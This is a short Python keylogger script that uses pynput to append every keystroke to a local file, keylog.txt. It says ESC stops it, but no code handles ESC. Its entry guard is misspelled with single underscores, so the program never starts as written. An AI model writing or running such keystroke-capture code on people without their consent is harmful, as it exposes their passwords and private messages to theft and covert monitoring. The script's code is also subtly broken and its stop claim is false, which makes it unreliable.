from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def main():
    print("Keylogger is running... (Press ESC to stop)")

    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if _name_ == "_main_":
    main()